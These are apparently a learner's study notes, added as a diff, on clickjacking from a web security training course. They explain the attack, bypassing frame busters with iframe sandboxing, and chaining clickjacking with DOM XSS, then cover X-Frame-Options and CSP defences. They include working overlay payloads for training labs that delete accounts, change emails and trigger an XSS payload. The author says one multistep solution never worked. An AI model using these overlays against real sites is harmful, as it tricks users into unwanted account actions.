@@ -6,3 +6,325 @@ Clickjacking is an interface-based attack in which a user is tricked into clicki
 
 A web user accesses a decoy website (perhaps this is a link provided by an email) and clicks on a button to win a prize. Unknowingly, they have been deceived by an attacker into pressing an alternative hidden button and this results in the payment of an account on another site. This is an example of a clickjacking attack. The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link, say, within an iframe. The iframe is overlaid on top of the user's anticipated decoy web page content. This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input.
 Protection against CSRF attacks is often provided by the use of a CSRF token: a session-specific, single-use number or nonce. Clickjacking attacks are not mitigated by the CSRF token as a target session is established with content loaded from an authentic website and with all requests happening on-domain. CSRF tokens are placed into requests and passed to the server as part of a normally behaved session. The difference compared to a normal user session is that the process occurs within a hidden iframe.
+
+* How to construct a basic clickjacking attack
+Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe layer overlaid on the decoy website. An example using the style tag and parameters is as follows:
+
+#+begin_src html
+<head>
+	<style>
+		#target_website {
+			position:relative;
+			width:128px;
+			height:128px;
+			opacity:0.00001;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:300px;
+			height:400px;
+			z-index:1;
+			}
+	</style>
+</head>
+...
+<body>
+	<div id="decoy_website">
+	...decoy web content here...
+	</div>
+	<iframe id="target_website" src="https://vulnerable-website.com">
+	</iframe>
+</body>
+#+end_src
+
+The target website iframe is positioned within the browser so that there is a precise overlap of the target action with the decoy website using appropriate width and height position values. Absolute and relative position values are used to ensure that the target website accurately overlaps the decoy regardless of screen size, browser type and platform. The z-index determines the stacking order of the iframe and website layers. The opacity value is defined as 0.0 (or close to 0.0) so that the iframe content is transparent to the user. Browser clickjacking protection might apply threshold-based iframe transparency detection (for example, Chrome version 76 includes this behavior but Firefox does not). The attacker selects opacity values so that the desired effect is achieved without triggering protection behaviors.
+
+** Lab: Basic clickjacking with CSRF token protection
+APPRENTICE
+
+LAB
+Solved
+This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
+
+To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+- solution:
+  I used the following payload to trick the user into clicking the delete button:
+  #+begin_src html
+	<style>
+		#target_website {
+			position:relative;
+			width:500px;
+			height:700px;
+			opacity:0.0001;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:100vw;
+			height:100vh;
+			z-index:1;
+			}
+#decoy_website button{
+position:absolute;
+top:480px;
+left:28px;
+padding:8px 48px;
+}
+	</style>
+
+<body>
+	<div id="decoy_website">
+<button>Click me</button>
+	</div>
+	<iframe id="target_website" src="https://0a0b00f803ce5970804d12d90033006f.web-security-academy.net/my-account">
+	</iframe>
+</body>
+
+  #+end_src
+
+
+** Clickbandit
+Although you can manually create a clickjacking proof of concept as described above, this can be fairly tedious and time-consuming in practice. When you're testing for clickjacking in the wild, we recommend using Burp's Clickbandit tool instead. This lets you use your browser to perform the desired actions on the frameable page, then creates an HTML file containing a suitable clickjacking overlay. You can use this to generate an interactive proof of concept in a matter of seconds, without having to write a single line of HTML or CSS.
+
+* Clickjacking with prefilled form input
+Some websites that require form completion and submission permit prepopulation of form inputs using GET parameters prior to submission. Other websites might require text before form submission. As GET values form part of the URL then the target URL can be modified to incorporate values of the attacker's choosing and the transparent "submit" button is overlaid on the decoy site as in the basic clickjacking example.
+
+** Lab: Clickjacking with form input data prefilled from a URL parameter
+APPRENTICE
+
+LAB
+Not solved
+This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
+
+To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+- solution:
+  I had to create a decoy website that was undeneath an iframe of another site, I used the following code: I had to use a defined width and height in px as this was the most reliable for screensizes:
+  	<style>
+		#target_website {
+			position:relative;
+			width:500px;
+			height:700px;
+			opacity:0.001;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:100vw;
+			height:100vh;
+			z-index:1;
+			}
+#decoy_website button{
+position:absolute;
+top:510px;
+left:38px;
+padding:8px 48px;
+}
+	</style>
+
+<body>
+	<div id="decoy_website">
+<button>Click me</button>
+	</div>
+	<iframe id="target_website" src="https://0af5008f03a0b2e681cb397b004e0064.web-security-academy.net/my-account?email=mine@gmail.com">
+	</iframe>
+</body>
+
+* Frame busting scripts
+Clickjacking attacks are possible whenever websites can be framed. Therefore, preventative techniques are based upon restricting the framing capability for websites. A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:
+
+- check and enforce that the current application window is the main or top window,
+- make all frames visible,
+- prevent clicking on invisible frames,
+- intercept and flag potential clickjacking attacks to the user.
+
+Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:
+
+#+begin_src html
+<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
+#+end_src
+Both the allow-forms and allow-scripts values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.
+
+** Lab: Clickjacking with a frame buster script
+APPRENTICE
+
+LAB
+Solved
+This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?
+
+To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+- solution:
+  This was the same as the previous labs, I just needed to sandbox the iframe:
+  #+begin_src html
+	<style>
+		#target_website {
+			position:relative;
+			width:500px;
+			height:700px;
+			opacity:0.00001;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:100vw;
+			height:100vh;
+			z-index:1;
+			}
+#decoy_website button{
+position:absolute;
+top:430px;
+left:38px;
+padding:8px 48px;
+}
+	</style>
+
+<body>
+	<div id="decoy_website">
+<button>Click me</button>
+	</div>
+	<iframe sandbox="allow-forms" id="target_website" src="https://0aa40085031f60c7838928fd00090011.web-security-academy.net/my-account?email=mine@gmail.com">
+	</iframe>
+</body>
+  #+end_src
+
+* Combining clickjacking with a DOM XSS attack
+So far, we have looked at clickjacking as a self-contained attack. Historically, clickjacking has been used to perform behaviors such as boosting "likes" on a Facebook page. However, the true potency of clickjacking is revealed when it is used as a carrier for another attack such as a DOM XSS attack. Implementation of this combined attack is relatively straightforward assuming that the attacker has first identified the XSS exploit. The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.
+
+** Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS
+PRACTITIONER
+
+LAB
+Solved
+This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.
+
+- solution:
+  I had to find the DOM XSS vulnerability where once submitted the website used the username to say thank you, I could then construct a basic xss payload that when combine with a clickjacking allowed me to run any xss.
+  #+begin_src html
+	<style>
+		#target_website {
+			position:relative;
+			width:500px;
+			height:850px;
+			opacity:0.5;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:100vw;
+			height:100vh;
+			z-index:1;
+			}
+#decoy_website button{
+position:absolute;
+top:780px;
+left:28px;
+padding:8px 48px;
+}
+	</style>
+
+<body>
+	<div id="decoy_website">
+<button>Click me</button>
+	</div>
+	<iframe id="target_website" src="https://0abc00df03382f228136526400cc0024.web-security-academy.net/feedback?name=%3Cimg%20src=%221%22%20onerror=%22print()%22/%3E&email=test@gmail.com&subject=t&message=t">
+	</iframe>
+</body>
+
+  #+end_src
+
+* Multistep clickjacking
+Attacker manipulation of inputs to a target website may necessitate multiple actions. For example, an attacker might want to trick a user into buying something from a retail website so items need to be added to a shopping basket before the order is placed. These actions can be implemented by the attacker using multiple divisions or iframes. Such attacks require considerable precision and care from the attacker perspective if they are to be effective and stealthy.
+
+** Lab: Multistep clickjacking
+PRACTITIONER
+
+LAB
+Not solved
+This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
+
+You can log in to the account yourself using the following credentials: wiener:peter
+
+- solution:
+  This was a similar solution to the other labs, I never got it to work, but I am unsure why, I did everything right. Here is my code:
+  #+begin_src html
+	<style>
+		#target_website {
+			position:relative;
+			width:500px;
+			height:650px;
+			opacity:0.5;
+			z-index:2;
+			}
+		#decoy_website {
+			position:absolute;
+			width:100vw;
+			height:100vh;
+			z-index:1;
+			}
+#decoy_website button.first{
+position:absolute;
+top:515px;
+left:20px;
+padding:8px 32px;
+}
+
+#decoy_website button.second{
+position:absolute;
+top:278px;
+left:185px;
+padding:8px 16px;
+}
+	</style>
+
+<body>
+	<div id="decoy_website">
+<button class="first">Click me first</button>
+<button class="second">Click me next</button>
+
+	</div>
+	<iframe id="target_website" src="https://0ade00c903bca28f81d17af600ea00ba.web-security-academy.net/my-account">
+	</iframe>
+</body>
+  #+end_src
+
+* How to prevent clickjacking attacks
+We have discussed a commonly encountered browser-side prevention mechanism, namely frame busting scripts. However, we have seen that it is often straightforward for an attacker to circumvent these protections. Consequently, server driven protocols have been devised that constrain browser iframe usage and mitigate against clickjacking.
+
+Clickjacking is a browser-side behavior and its success or otherwise depends upon browser functionality and conformity to prevailing web standards and best practice. Server-side protection against clickjacking is provided by defining and communicating constraints over the use of components such as iframes. However, implementation of protection depends upon browser compliance and enforcement of these constraints. Two mechanisms for server-side clickjacking protection are X-Frame-Options and Content Security Policy.
+
+Read more
+Find clickjacking vulnerabilities using Burp Suite's web vulnerability scanner
+X-Frame-Options
+X-Frame-Options was originally introduced as an unofficial response header in Internet Explorer 8 and it was rapidly adopted within other browsers. The header provides the website owner with control over the use of iframes or objects so that inclusion of a web page within a frame can be prohibited with the deny directive:
+
+X-Frame-Options: deny
+Alternatively, framing can be restricted to the same origin as the website using the sameorigin directive
+
+X-Frame-Options: sameorigin
+or to a named website using the allow-from directive:
+
+X-Frame-Options: allow-from https://normal-website.com
+X-Frame-Options is not implemented consistently across browsers (the allow-from directive is not supported in Chrome version 76 or Safari 12 for example). However, when properly applied in conjunction with Content Security Policy as part of a multi-layer defense strategy it can provide effective protection against clickjacking attacks.
+
+Content Security Policy (CSP)
+Content Security Policy (CSP) is a detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking. CSP is usually implemented in the web server as a return header of the form:
+
+Content-Security-Policy: policy
+where policy is a string of policy directives separated by semicolons. The CSP provides the client browser with information about permitted sources of web resources that the browser can apply to the detection and interception of malicious behaviors.
+
+The recommended clickjacking protection is to incorporate the frame-ancestors directive in the application's Content Security Policy. The frame-ancestors 'none' directive is similar in behavior to the X-Frame-Options deny directive. The frame-ancestors 'self' directive is broadly equivalent to the X-Frame-Options sameorigin directive. The following CSP whitelists frames to the same domain only:
+
+Content-Security-Policy: frame-ancestors 'self';
+Alternatively, framing can be restricted to named sites:
+
+Content-Security-Policy: frame-ancestors normal-website.com;
+To be effective against clickjacking and XSS, CSPs need careful development, implementation and testing and should be used as part of a multi-layer defense strategy.
